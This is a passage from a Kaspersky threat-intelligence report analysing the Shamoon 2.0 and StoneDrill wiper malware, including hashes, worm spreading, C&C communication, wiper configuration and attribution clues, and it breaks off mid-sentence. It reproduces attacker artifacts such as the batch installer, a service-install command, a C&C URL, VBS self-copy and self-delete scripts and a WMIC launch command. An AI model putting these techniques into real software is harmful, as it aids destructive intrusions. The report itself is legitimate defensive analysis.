Shamoon, StoneDrill and NewsBeef are available to\nsubscribers o\nf\nKaspersky Lab\u2019s Private Intelligence Reports\n. For more information please\ncontact:\nintelreports@kaspersky.com\n,\nContact:\nintelreports@kaspersky.com\n7\n2. Technical details\n-\nShamoon 2.0\n-\nlanguage\nusage and possible Yemeni links\nSeveral good technical articles on Shamoon 2.0\nhave been\npublished by some of our\ncolleagues\n, including\nPalo Alto\n,\nIBM X\n-\nForce\n,\nSymantec\nand others.\nThroughout this blog we describe some of the technical details of the new Shamoon\n2.0 attacks\nand what are the most important things that make them stand out. For the analysis we used the\nearliest set of samples\n,\nwith\na\nhardcoded attack date of 17 November 2016\n. H\nowever, we\u2019ve\nalso included details\nfrom the newer samples\n, such as hardc\noded credentials.\nDuring deployment in the victim\u2019s environment, the main Shamoon 2.0 wiper module is installed\nthrough a Windows Batch file with the following content:\n@echo off\nset u100=ntertmgr32.exe\nset u200=service\nset u800=%~dp0\ncopy /Y\n\"%u800%%u100%\" \"%systemroot%\n\\\nsystem32\n\\\n%u100%\" start /b %systemroot%\n\\\nsystem32\n\\\n%u100%\n%u200%\nInterestingly, the sample resources appear to have a language ID of \u201cArabic (Yemen)\u201d,\nsuggesting the attackers might be from Yemen. Of course, we should not\ndisreg\nard\nthe\npossibility that the resource language could be a false flag planted there by the attackers.\n2.1. 32\n-\nbit Shamoon dropper/worm (ntssrvr32.exe)\nSHA256\n394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\nMD5\n5446f46d89124462ae7aca4fce420423\nCompiled\n2009.02.15 12:31:44 (GMT), VC 2010\nType\nI386 Console EXE\nSize\n1 349 632 bytes\nThis executable is a worm designed to infect computers connected\nto\na Windows domain. To\nachieve this, it relies on a list of hardc\noded, previously stolen username/password pairs\nbelonging to administrators of the targeted domain. All the strings in the malware are obfuscated\n,\nContact:\nintelreports@kaspersky.com\n8\nwith simple\none\nbyte ADD operations and are decrypted upon execution. All the dropped files\nexhibit file times\naltered to match that of the system\u2019s\nkernel32.dll\n. The module only works if it\nis run with exactly one command line parameter, regardless of the parameter. Otherwise, it\nsimply exits (likely a measure to avoid accidental execution).\nIf the victim host\u2019s\nsystem \u201c\nPROCESSOR_ARCHITECTURE\n\u201d environment variable is \u201c\nAMD64\n\u201d\nor \u201c\namd64\n\u201d, the module installs its 64\n-\nbit variant. The variant is contained within a resource\nnamed \u201cX509\u201d. The resource is de\n-\nXORed and dropped onto the system under:\n<\n%WindowsDir%\n\\\nsystem32\n\\\nntssrvr64.exe>\n.\nIt is then installed as a service via the command:\n\u201ccmd.exe /c \"ping\n-\nn 30 127.0.0.1 >nul && sc config NtsSrv binpath=\n\"C:\n\\\nWINDOWS\n\\\nsystem32\n\\\nntssrvr64.exe LocalService\" && ping\n-\nn 10 127.0.0.1 >nul && sc start NtsSrv\u201d\n2.1.1.\nInstallation as a Service\nIf the malware is running on a 32\n-\nbit system, this module installs itself as a service named\n\u201cNtsSrv\u201d:\nName\nDisplay Name\nDescription\nNtsSrv\nMicrosoft Network Realtime\nInspection Service\nHelps guard against time change attempts\ntargeting known\nand newly discovered vulnerabilities in network time protocols\nhe service is set as dependent on the \u201cRpcSs\u201d system service. The properties of the system\nservice \u201cLanmanWorkstation\u201d are changed so that it depends on the newly created \u201cNtsS\nrv\u201d\nservice to allow it to start after the malware.\n2.1.2. Worm Functionality\nOnce this module runs (as a service), the worm\n-\nspreading functionality is started\n,\ntargeting\nevery network host within the IPv4 address range\n,\nwith the same first\nthree\nbytes of\nthe victim\u2019s\nIP and the last byte in the range from 0 to 255, thus operating inside subnet class C (a.b.c.0/24).\nHere\u2019s how it works:\n1.\nThe worm connects to a remote machine\u2019s registry and disables Remote UAC by setting\nthe\nLocalAccountTokenFilterPolicy\nregi\nstry key value to 1 in\nHKEY_LOCAL_MACHINE\n\\\nSOFTWARE\n\\\nMicrosoft\n\\\nWindows\n\\\nCurrentVersion\n\\\nPolicies\n\\\nsystem.\n2.\nIf the RemoteRegistry system service is disabled and doesn't run on the target system,\nthe worm reconfigures this service to be auto\n-\nstarted and then start\ns it immediately. If\nthe connection to a remote registry is unsuccessful, the worm repeats the connection\nattempt with a hardcoded set of stolen domain administrator credentials. The worm then ,\nContact:\nintelreports@kaspersky.com\n9\nsearches for remote \u201c\n\\\nwindows\n\\\nsystem32\n\\\ncsrss.exe\n\u201d files by prep\nending this path with\nthe victim machine\u2019s IP as well as system shares: \"\nADMIN$\n\", \"\nC$\n\", \"\nD$\n\", \"\nE$\n\".\n3.\nOnce a remote system32 folder is found, the worm copies itself into this folder under the\nname \u201c\nntssrvr32.exe\n\u201d. It schedules a remote job to run \u201c\nntssrvr32\n.exe LocalService\n\u201d\nafter 90 seconds.\n4.\nIf the remote scheduler is inaccessible, the worm tries to set up NtsSrv and runs the\nservice on the remote machine with the same parameters as it used for self\n-\ninstallation.\nAttempts with stolen credentials are also pe\nrformed.\n5.\nAn\nalternative\nbut similar infection method is coded in\nto\nthe worm, where each infection\nis performed in a separate thread without relying on the scheduler; but it is not used at\nthis time.\n2.1.3. Command and Control (C&C) Module\nAfter replication\n, the malware runs a command\n-\nand\n-\ncontrol communication module. This\nmodule is contained within a resource named \u201c\nPkcs7\n\u201d. It is de\n-\nXORed and dropped as\n<\n%WindowsDir%\n\\\nsystem32\n\\\nnetinit.exe>\n. Using the hardcoded credentials, it creates a\nWindows Task Scheduler\njob that executes netinit.exe 90 seconds after creation. It waits 95\nseconds and then deletes the scheduled job.\n2.1.4. Wiper and Encryptor Module\nFinally, the malware drops the wiper/encryptor\nmodule. This module first checks if it\u2019s time to\nrun the main payload. The activation period can be set in two ways:\n1.\nIt checks if the system time is not earlier than the time specified in the following file:\n<%windir%\n\\\ninf\n\\\nusbvideo324.pnf>\n2.\nIf the file does\nn\u2019t exist, it checks that the system time is not earlier than the hardcoded\ndate:\n<20:45, 17 Nov 2016>\nAt the specified time, the malware drops\ntwo\nfiles:\nThe first file,\n<c:\n\\\nwindows\n\\\ntemp\n\\\nkey8854321.pub>\nis unused in this attack and contains a\npublic encry\nption key. This is an indicator that the attackers might be using\nShamoon as a\nransomware tool\nin upcoming waves.\n\u201d\n-----\nBEGINPUBLICKEY\n-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAusZItknNNeV+xjPzIZLyB5m6gaNREC6I3CZQ7F1vDU\nCaGki83s6JVDo2NGN70mhx4q5NJrg\nXDzD7McpxDoJsDkKwr5mm3yEs9vmZwHcEWcvU6QbJguFgPJk6zoatVq0\nWsfIkN50ywQMVq2zmiJel2UoalPJzCWbAYG0BShXjnlcsfV8GcPW+fNRCSGKVue3RE6cV5HlAjSD8VSk4KERPu\nWfvbk/pP0qDE60Uc7K3Bl7uxbHVB2g8unuj8B9d81TKT0hForie8V2N4FT0bdAHUHU6LT/XtAdLCp9/cTUf8zk1MC\noxXj6CSg9xKgGgnJazC/u3R0n\nm/pPriF/ZkwrVhJtDd/1nf4JC1sDmc3mgv0hI+7hthf+fZkv75doHg67Gg6JOZQIMytQ\neF8ylnUgC1ZyrAmaxN0OV69zhktzZISdmmkbtyZSHEZzIdC9PF/MJzCK5ylkEI2jQpAabgv34o2o+ZMJLSDZbNrXy9\n0LUy8GjtzJYmv02MVLjy7CSgglIbulSgMP4QC/i1fTIPhlSlMyCKnGIKdKY31KFQnoOzI8kudeted8eF/ubpFcna0TDc\nEk+Dt8\ns4pN4/DsGQoncWg9HMyC8Q/MWIE/JuOCisovJ0PYq2aKetDNRMm7THcXalXKD9RpczObRWKGKzMJD\nonmBm2AETME74MRPmC/FWgsCAwEAAQ==\n-----\nENDPUBLICKEY\n-----\n\u201d\n,\nContact:\nintelreports@kaspersky.com\n10\nThe second file is dropped from a resource named \u201c\nPKCS12\n\u201d. It is de\n-\nXORed and dropped into\nthe %system% directory with\na name randomly selected from\nthe\nfollowing list:\ncaclsrv.exe\ndvdquery.exe\nmsinit.exe\nsigver.exe\nwcscript.exe\ncertutl.exe\nevent.exe\nntfrsutil.exe\nrouteman.exe\nntnw.exe\nclean.exe\nfindfile.exe\nntdsutl.exe\nrrasrv.exe\nnetx.exe\nctrl.exe\ngpget.exe\npower.exe\nsacses.exe\nfsutl.exe\ndfrag.exe\nipsecure.exe\nrdsadmin.exe\nsfmsc.exe\nextract.exe\ndnslookup.exe\niissrv.exe\nregsys.exe\nsmbinit.exe\nThe dropped payload is then scheduled to run in the same way as the C&C communication\nmodule. We describe it in detail\nbelow.\n2.2. 64\n-\nbit Shamoon Dropper (ntssrvr64.exe)\nSHA256\n47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\nMD5\n8fbe990c2d493f58a2afa2b746e49c86\nCompiled\n2009.02.15 12:32:19 (GMT), VC 2010\nType\nAMD64 Console EXE\nSize\n717 312 bytes\nThis dropper\nhas\nthe same functionality as the 32\n-\nbit variant. This version is contained within a\nresource named \u201c\nX509\n\u201d. The resource is de\n-\nXORed and dropped onto the system under:\n<%WindowsDir%\n\\\nsystem32\n\\\nntssrvr64.exe>\n.\n2.2.1. C&C Communication Module (net\ninit.exe)\nSHA256\n61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842\nMD5\n5bac4381c00044d7f4e4cbfd368ba03b\nCompiled\n2009.02.15 12:29:20 (GMT), VC 2010\nType\nI386 Console EXE\n,\nContact:\nintelreports@kaspersky.com\n11\nSize\n159 744 bytes\nSHA256\n772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5\nMD5\nac4d91e919a3ef210a59acab0dbb9ab5\nCompiled\n2009.02.15 12:29:41 (GMT), VC 2010\nType\nAMD64 Console EXE\nSize\n183 808 bytes\nThe strings in the C&C module are obfuscated by simple ADD operations and are decrypted\nupon execution. This module periodically connects to\na\nC&C with the following URL:\nhxxp://server/category/page.php?\nshinu=\nw74K9/xQp1VjJfwwadq4HCl7VheuQXk49YnNkb\nXR+0ghrH\nYIRFE51FQskZya+jIPqo3VlOEpfvvgxvO26pZ3oA==\nThe strange \u201c\nserver\n\u201d in the URL string suggests multiple possibilities:\n1.\nIt is used by mistake.\n2.\nIt may suggest a placeholder value that wasn\u2019t set for the purposes of this attack.\n3.\nA server with this name might be\ninstalled by the attackers somewhere inside the local\nnetwork.\n4.\nThe local network may rely on a now poisoned DNS server.\nThe string also contains the word \u201c\nshinu=\n\u201d, which is quite interesting. This is possibly a\ntransliteration of the Gulf Arabic slang wor\nd\n\u2018\n\u0648\u0646\u0634\n\u2019\nfor\n\u2018\nwhat?\n\u2019.\nThis particular slang is used in\nseveral countries, notably Iraq, but also sometimes in Kuwait and Bahrain. The \u201cshinu\u201d\nparameter string contains the following encoded information about the victim system:\n\u25cf\nHost IP and MAC addresses\n\u25cf\nWind\nows version information\n\u25cf\nWindows input locale IDs (keyboard layouts)\n\u25cf\nNumber of connection attempts, or content of the\n<%WINDIR%\n\\\ninf\n\\\nnetimm173.pnf>\nfile\nif the file exists. The\n<netimm173.pnf>\nfile contains information about changes made by\nthe wiper payload\nmodule.\nIf the direct connection fails, this module tries to connect using a hardcoded proxy\nserver\nof\n\u201c1.1.1.1:8080\u201d. This supports the assumption that the malware deployed in this case does not\ninclude a working C&C and the operators used a raw, unconfi\ngured C&C module.\nData received from the C&C server is handled in two possible ways:\n1.\nAn executable file is downloaded as\n<%TEMP%\n\\\nTemp\n\\\nfiler%rndDigits%.exe>\nand\nexecuted immediately thereafter.\n,\nContact:\nintelreports@kaspersky.com\n12\n2.\nA file is dropped in\n<%WINDIR%\n\\\ninf\n\\\nusbvideo324.pnf>\nthat contai\nns the wiper\npayload\u2019s activation time. This effectively allows the attackers to configure the wiper\ntime\nbomb\n.\n2.2.2. Disk Wiper/Encryptor Module\nSHA256\n128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd\nMD5\n2cd0a5f1e9bcce6807e57ec8477d222a\nCompiled\n2009.02.15 12:30:19 (GMT), VC 2010\nType\nI386 Console EXE\nSize\n282 112 bytes\nSHA256\nc7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\nMD5\nc843046e54b755ec63ccb09d0a689674\nCompiled\n2009.02.15 12:30:41 (GMT), VC 2010\nType\nAMD64 Console EXE\nSize\n327 680 bytes\nDespite the wide\nspread\ncoverage of the resurgence of the Shamoon wiper, few have noted the\nnew ransomware functionality. The wiper module of Shamoon 2.0 has been designed to run as\neither a wiper or an encryptor (ran\nsomware).\n1.\nThe module is configured to wipe the disk using the\n\u201cDeath of Alan Kurdi\u201d\nphoto\n. The\npicture depicts a three\n-\nyear\n-\nold Syrian refugee who drowned as his family attempted to\nreach E\nurope and\ntravel on\nto Canada. The module can also be configured to wipe the\ndisk using random data.\n2.\nIn the \u201cencryption/ransomware\u201d mode, a weak pseudo\n-\nrandom RC4 key is generated,\nwhich is further encrypted by the RSA public key and stored directly on the hard drive (at\n<\n\\\nDevice\n\\\nHarddisk0\n\\\nPartition0>)\nstarting at offset 0x201, right after the master boot\nrecord.\n3.\nOnce the module is extracted, it drops a legitimate driver named\n<DRDISK.SYS>\nto the\ndisk and starts it. This driver is used for low\n-\nlevel disk operations and is well known from\nprevious Shamoo\nn attacks. Before accessing this driver, the system date is changed to\na random day\nbetween\nthe\n1st\nand\n20th of Aug\nust\n, 2012 to fool the driver\u2019s license\nchecks and evaluation period.\n,\nContact:\nintelreports@kaspersky.com\n13\n4.\nThe payload employs the file\n<%WINDIR%\n\\\ninf\n\\\nnetimm173.pnf>\nto keep track\nof the\noperations performed. The content of this file is sent to the C&C server by the\ncommunication module.\n5.\nThe strings in this module are also obfuscated by simple ADD operations and decrypted\nat start.\n2.2.3. Payload Configuration\nThere are two 25\n-\nb\nyte length configuration strings in the wiper payload:\n\u25cf\n\u201c\nSPPPPPPPPPMPPHHHHHHHHHHBO\n\u201d\n\u25cf\n\u201c\nNNNNNNNNNNWNNNNNNNNNNNWWW\n\u201d\nLetters in the first string specify a type of operation to be performed, with the available operations\nexplained below. The second string design\nates how these operations should be performed: the letter '\nN\n'\nmeans that the operation will be executed synchronously in separate threads, the letter '\nW\n' means the\noperation will wait until a previous step is completed.\nHere\u2019s an explanation of the configu\nration string above:\nLetter\nOperation\nS\nThe first operation, marked by the letter '\nS\n' wipes (or encrypts) the content of the Shamoon\n2\n.0\ncomponents (netinit.exe, ntssrvr32.exe, and wiper module itself). Using the low\n-\nlevel disk\naccess driver makes it poss\nible to wipe the body of a running executable.\nP\nThe next 9 '\nP\n' letters indicate wiping (or encrypting) of the files placed inside the traditional\nuser folders: desktop, download, document, desktop, download, document, picture, video,\nand music.\nM\nThe '\nM\n' wipes (or encrypts) the NTFS MFT data on all accessible drives mapped from A: to\nZ:, except the system drive.\nP\nThe next two '\nP\n' letters wipe (or encrypt) files inside the following folders:\n<C:\n\\\nWindows\n\\\nSystem32\n\\\nDrivers> and\n<C:\n\\\nWindows\n\\\nSystem32\n\\\nConfig\n\\\nsystemprofile>\nH\nThe 10 '\nH\n' letters wipe (or encrypt)\nsome\nof the partitions from 9 to 0 on hard disks 9\n-\n0\n(SystemBoot and FirmwareBootDevice partitions and partition 0 on the system drive are\nskipped\nin\nthis step)\nB\nThe '\nB\n' l\netter wipes (or encrypts) part of the partition designated as FirmwareBootDevice\nO\nThe final '\nO\n' wipes (or encrypts) the Master File Table on the system drive, the first sector of\n\\\nDevice\n\\\nHarddisk0\n\\\nPartition0, and the\nlast\npart of the SystemBootDevice\npartition.\nTwo minutes after all tasks are completed, the system is rebooted with the following command:\n\u201c\nshutdown\n-\nr\n-\nf\n-\nt 2\n\u201d.\n,\nContact:\nintelreports@kaspersky.com\n14\n2.2.4. Low\n-\nLevel Disk Access Driver (DRDISK.SYS)\nSHA256\n4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6\nMD5\n1493d342e7a36553c56b2adea150949e\nCompiled\n2011.12.28 16:51:24 (GMT), VC 2005\nType\nI386 Native\nSize\n27 280 bytes\nSHA256\neaee62a8238189e8607b24c463a84c83c2331a43b034484972e4b302bd3634d9\nMD5\n42f883d029b47f9d490a427091da3f5d\nCompiled\n2011.12.28\n16:51:29 (GMT), VC 2005\nType\nAMD64 Native\nSize\n31 998 bytes\nThese signed legitimate drivers\nform\npart of the\nEldoS RawDisk product\n. This product is\ndesigned to provide direct access to disks and protected files fr\nom user\n-\nmode applications.\nSadly, this functionality has been adopted and abused by multiple threat actors to develop wiper\nmalware, as in the case of the\noriginal Sh\namoon\nor the\nLazarus Destover\nmalware used in the\ninfamous Sony Pictures Entertainment attack of 2014. In order to bypass the EldoS RawDisk\ndrivers\u2019 evaluation period license checks, the\nShamoon 2.0 malware changes the system date\nto a random day\nbetween the\n1st\nand\n20th of Aug\nust\n, 2012.\n2.3. From Shamoon 2.0 to StoneDrill 1.0\nStoneDrill has some style similarities to the previously discovered Shamoon\nsamples.\nParticularly interesting is the heavy use of anti\n-\nemulation techniques in the malware, which\nprevents the automated analysis by emulators or sandboxes.\nOne of the most interesting characteristics is the presence of the Persian language in multipl\ne\nresource sections.\n,\nContact:\nintelreports@kaspersky.com\n15\nSamples of the StoneDrill malware were uploaded multiple times to multiscanner systems from\nSaudi Arabia between 27 and 30 November 2016. One StoneDrill victim was also observed in\nthe Kaspersky Security Network (KSN) in Europe.\n2.4\n. The StoneDrill wiper\nSHA256\n62aabce7a5741a9270cddac49cd1d715305c1d0505e620bbeaec6ff9b6fd0260\nMD5\n0ccc9ec82f1d44c243329014b82d3125\nCompiled\n1999.02.08 06:15:47 (GMT), VC 2015\nType\nI386 GUI EXE\nSize\n195072 bytes\nThe malware PE file timestamp is fake\n;\nhowever\n,\nthe\nauthors forgot to alter a timestamp inside\nthe debug directory. The real timestamp from the debug directory points to: 2016.11.14\n21:16:45\n,\nContact:\nintelreports@kaspersky.com\n16\n1.\nThe module highlighted above starts from a heavy anti\n-\nemulation function that contains\nnumerous WinA\nPI calls with invalid parameters. The goal is to break through the\ndetection of antivirus emulators and heuristic detection.\n2.\nThe second anti\n-\nemulation technique is run before the payload execution: this module\ncreates a hidden dialog window, then finds an\nd programmatically clicks the \u201cOK\u201d button\non that dialog. After that, another series of incorrect WinAPI calls follow.\n3.\nThe malware then finds the file path of\nthe\ndefault Internet browser app by looking into\nthe following registry keys:\na.\nSOFTWARE\n\\\nMicrosoft\n\\\nWindows\n\\\nShell\n\\\nAssociations\n\\\nUrlAssociations\n\\\nhttp\n\\\nUs\nerChoice\nb.\nHKCR\n\\\n%ProgId_val%\n\\\nshell\n\\\nopen\n\\\ncommand\n4.\nThe malware then checks to ensure the browser is not\nLaunchWinApp.exe\nor is\ncompiled for the 64\n-\nbit architecture, in\nwhich\ncase the path of\n\u201c\n%PROGRAM_FILESX86%\n\\\nInternet Explorer\n\\\niexplore.exe\n\u201d is used instead.\n5.\nThe default browser is then started and the wiper module is injected into the running\nbrowser memory.\n6.\nAfter the successful start of the wiper module, the following script is dropped and\nexecuted: \u201c\n%temp%\n\\\nC\n-\nDlt\n-\nC\n-\nOrg\n-\nT.vbs\u201d\n7.\nAnother temporary file is dropped \u201c%temp%\n\\\nC\n-\nDlt\n-\nC\n-\nTrsh\n-\nT.tmp\n\u201d which contains the\nname of the Injector module; this file is deleted after execution is completed.\nWScript.Sleep(10 * 1000)\nOn Error Resume Next\nSet WshShell = CreateObject(\"\nScripting.FileSystemObject\")\nWhile WshShell.FileExists(\"%selfname%\")\nWshShell.DeleteFile \"%selfname%\"\nWend\nWScript.Sleep(10 * 1000)\nWshShell.DeleteFile \"%temp%\n\\\nC\n-\nDlt\n-\nC\n-\nOrg\n-\nT.vbs\"\nSet WshShell = Nothing\n%temp%\n\\\nC\n-\nDlt\n-\nC\n-\nOrg\n-\nT.vbs File contents\n2.4.1. The Sto\nneDrill Disk Wiper Module\nSHA256\nbf79622491dc5d572b4cfb7feced055120138df94ffd2b48ca629bb0a77514cc\nMD5\n697c515a46484be4f9597cb4f39b2959\nCompiled\n2016.11.14 21:16:40 (GMT), VC 2015\nType\nI386 GUI EXE\nSize\n130 560 bytes\nUnlike Shamoon, the StoneDrill\ndisk wiper module is not written onto disk but instead is injected\ndirectly into the user\u2019s preferred browser process memory. This module inherits the second anti\n-,\nContact:\nintelreports@kaspersky.com\n17\nemulation trick only (clicking the button on the hidden dialog window); it is also obfuscate\nd with\nthe same alphabet\n-\nbased string encryption. If the browser process privileges do not permit the\nraw disk wiping, only the user\n-\naccessible files are deleted.\nDepending on the configuration, this module wipes with random data one of foll\no\nwing possible\ntargets:\n\u25cf\nAll accessible physical drives by using the device path \u201c\n\\\n\\\n.\n\\\nPhysicalDrive\n\u201d\n\u25cf\nAll accessible logical drives by using device path \u201c\n\\\n\\\n.\n\\\nX:\n\u201d\n\u25cf\nRecursively wipes and deletes files in all folders except \u201c\nWindows\n\u201d on all accessible\nlogical drives\n\u25cf\nPlaces a\nspecial emphasis\non\nwiping files named \u201c\nasdhgasdasdwqe%digits%\n\u201d in the\nroot folder of the disk.\nJust like Shamoon, after the wipe process is completed, the system is rebooted.\n2.5. The StoneDrill backdoor\nAccording to the PE timestamps from StoneDrill samp\nle\ntwo\nand sample\none\n(2016.10.19 and\n2016.11.14 respectively), this malware file was compiled a month before the previously\ndescribed StoneDrill sample. However, internally this tool wrapper (injector) looks like a more\nmodern evolution of the previously\ndiscussed wiper wrapper.\nThe sample is generally of low quality, with many unused code blocks, unreliable anti\n-\nemulation\nand few non critical bugs. In some cases functions are executed but the results are not used\n:\n\u25cf\nI\ns the current user a domain administrat\nor\n?\n\u25cf\nI\ns the antivirus process currently running\n?\n\u25cf\nIs the current process running in a virtual environment such as VMware or VirtualBox?\n2.6. The StoneDrill Installer/Injector module\nSHA256\n69530d78c86031ce32583c6800f5ffc629acacb18aac4c8bb5b0e915fc4cc4db\nMD5\nac3c25534c076623192b9381f926ba0d\nCompiled\n2016.10.19 14:26:01 (GMT), VC 2015\nType\nI386 GUI EXE\nSize\n227840\nbytes\n2.6.1. First step: anti\n-\nemulation tricks\nThis module is very similar to\nthe\nabove discussed injector module, utilizing the same set of\nanti\n-\nemulation tricks, injection into\nthe user\u2019s preferred\nbrowser and\nVBS\nscripts. A distinction in ,\nContact:\nintelreports@kaspersky.com\n18\nthis sample is the wide utilization of the WMI command\n-\nline (WMIC) utility to run tasks such as\nrunning the dropped VBS script or\nmaking\nregistry modificat\nions.\nStrings in this module are encrypted\nin\ntwo\nways:\n\u25cf\nAlphabet replacement\n\u25cf\nSSE XOR 0x5235\n2.6.\n2\n. Second step: name construction\nand installation\nThis module checks if it is already running from the \u201c%COMMON_APPDATA%\n\\\nChrome\u201d\nfolder.\nIn cases where the malware is started from a different folder, the installation procedure is\nstarted.\nDuring installation, a name is constructed through concatenation of three randomly selected\nstrings from the below three sets\n\u2013\nfor example\nPower\nNetworkProxy, RAMFirewallTransfer,\nLocationAgentFramework):\nSet1\nIntel, AMD, Microsoft, Windows, Java, Adobe, Cisco, SunGard, Query, Location, Power, NFC, DotNet,\nMFC, WMI, SQL, Office, Bitlocker, Map, Fingerprint, Packet, Registery, RAM, CPU, ROM, Memory,\nMonitor, CDROM, Run\n-\ntime, Task, Ethernet, Application, Lockscreen, Cloud, Browser, Cash, Desktop,\nDisplay\nSet2\nFile, System, Service, Device, Software, Hardware, VM, Network, Performance, Graphic, Engine, Agent,\nData, Wizard, Server, Media, History, Stor\nage, Core, boot, Gaming, Firewall\nSet3\nManager, Arranger, Controller, Host, Help, Diagnostics, LogOn, Plug, Proxy, Events, Transfer, Policy,\nRecovery, Details, Provider, Adapter, CleanUp, Encryption, Extention, APP, Client, Menu, Stub,\nExecute, Luncher, F\nramework, Tester, Model, Backup, API\nThe VBS script \u201c%TEMP%\n\\\nC\n-\nPDC\n-\nC\n-\nCpy\n-\nT.vbs\n\u201d is then dropped in\n%TEMP%\n\\\nOn Error Resume Next\nSet WshShell = CreateObject(\"Scripting.FileSystemObject\")\nWshShell.CopyFile \"\n%SELF_NAME%\n\" , \"\n%COMMON_APPDATA%\n\\\nChrome\n\\\n%SELECTED_NAME%\n.exe\"\nSet WshShell = Nothing\nC\n-\nPDC\n-\nC\n-\nCpy\n-\nT.vbs body template\nThe script is executed using the following command to do self\n-\ncopy into the\n\u201c%COMMON_APPDATA%\n\\\nChrome\u201d\nfolder:\ncmd /c WMIC Process Call Create \"C:\n\\\nWindows\n\\\nSystem32\n\\\nWscript.exe //N\nOLOGO\n%TEMP%\n\\\nC\n-\nPDC\n-\nC\n-\nCpy\n-\nT.vbs\"\nAnother VBS script named \u201c\nC\n-\nPDI\n-\nC\n-\nCpy\n-\nT.vbs\n\u201d is dropped into %TEMP% folder and executed\nin the same method (via WMIC used to make\na\nsecond malware copy with pathname)\n\u201c\nC:\n\\\nProgramData\n\\\nInternetExplorer\n\\\n%SELECTED_NAME%Stp.exe\n\u201d\n,\nContact:\nintelreports@kaspersky.com\n19\nOn Error Resume Next\nSet WshShell = CreateObject(\"Scripting.FileSystemObject\")\nWshShell.CopyFile \"\n%COMMON_APPDATA%\n\\\nChrome\n\\\n%SELECTED_NAME%\n.exe\" ,\n\"C:\n\\\nProgramData\n\\\nInternetExplorer\n\\\n%SELECTED_NAME%\nStp.exe\"\nC\n-\nPDI\n-\nC\n-\nCpy\n-\nT.vbs body template\nPathnames of these\ntwo VBS files as well as\nthe\ninitial malware pathname are written into\n%TEMP%\n\\\nC\n-\nDlt\n-\nC\n-\nTrsh\n-\nT.tmp\nfile.\nAt the end of the installation procedure the copy of malware (found in\n\u201c%COMMON_APPDATA%\n\\\nChrome\n\\\n%SELECTED_NAME%\n.exe\n\u201d) is executed (via \u201c\ncmd /c\nwmic proce\nss call create\n\u201d) and\nthe\ninitial process terminate\ns\nitself.\n2.6.\n3\n.\nThird\nstep\nWhen the malware is started from within the \u201c%COMMON_APPDATA%\n\\\nChrome\n\u201d folder, the\n\u201c\nFileInfo.txt\n\u201d file is created in the same folder and contains the pathname of the first copy of\nmalware (\u201c%COMMON_APPDATA%\n\\\nChrome\n\\\n%SELECTED_NAME%\n.exe\n\u201d)\nThen the third copy of the malware is created by the command \u201c\n%COMSPEC% /c copy\n\"%SELFNAME\" %TEMP%\n\\\nbd891.tmp\n\u201d, which checks\nthe\ntarget file to verify if command\nexecution is successful, then deletes\nthe bd891.tmp file. The last mentioned is used as another\nanti\n-\nemulation trick in the StoneDrill arsenal.\n2.6.\n4\n.\nFourth\nstep: Payload injection\nThe payload is extracted from the resources section, decrypted and unpacked similarly to the\npreviously describe\nd wiper injector module. The difference here is that for the decryption of the\npayload module, SSE instructions are used.\nIn the same style, the payload is injected into the user preferred browser process, with an\nadditional step after the payload module i\nnjection: the resource segment responsible for the\npayload configuration is replaced in memory with the resource taken from\nthe\nparent module.\nAfter the payload start is attempted, the\nVBS\nfiles listed inside\nC\n-\nDlt\n-\nC\n-\nTrsh\n-\nT.tmp\nand\nC\n-\nDlt\n-\nC\n-\nTrsh\n-\nT.tmp\nare d\neleted.\n2.6.\n5\n.\nFifth\nstep: If not started\nIf the payload is not started\n,\nthen %TEMP%\n\\\nC\n-\nDlt\n-\nC\n-\nOrg\n-\nT.vbs\nis dropped and executed to\ndelete initial malware copy.\nWScript.Sleep(10 * 1000)\nOn Error Resume Next\nSet WshShell = CreateObject(\"Scripting.FileSystemOb\nject\")\nWhile WshShell.FileExists(\"\n%initial_malware_pathname%\n\")\nWshShell.DeleteFile \"\n%initial_malware_pathname%\n\"\nWend\n,\nContact:\nintelreports@kaspersky.com\n20\nWScript.Sleep(10 * 1000)\nWshShell.DeleteFile \"\n%TEMP%\n\\\nC\n-\nDlt\n-\nC\n-\nOrg\n-\nT.vbs\"\nSet WshShell = Nothing\n2.7. StoneDrill\nr\nemote access payload\nmodule\nSHA256\n105ee777ad31a58301310719b49c7b6a7e957823e4dabbfeaa6a14e313008c1b\nMD5\ne3a82d1db3ae8b189d2e1e0a22d6c82f\nCompiled\n2016.10.19 16:49:36 (GMT), VC 2015\nType\nI386 GUI EXE\nSize\n317 440 bytes\nVersion\n2.0.1610.76\nThis module is not dropped into disk but injected directly into the user preferred browser\nprocess memory. The module is written in C++ with\nthe use of\nSTL classes, with numerous\nforgotten debug strings.\n2.7.1. First step: Decryption\nStrings in this module\nare encrypted by ROR, NEG, ADD or simply XOR. An unreliable anti\n-\nemulation technique is utilized which makes the whole module unstable. The author assumed\nthat the execution of\nthe\nSleep function with parameter 4020 milliseconds\nwould\nincrease the\nsystem\nvalue of KUSER_SHARED_DATA::InterruptTime to\nfour\nseconds (rounded to\nthe\nnearest\nsecond). If the InterruptTime\nis\nincreased only by\ntwo\nseconds this module just exits\nimmediately\n.\nIn case of other values, the module will crash due\nto the\nincorrect\ndecryption of\nstrings.\nThe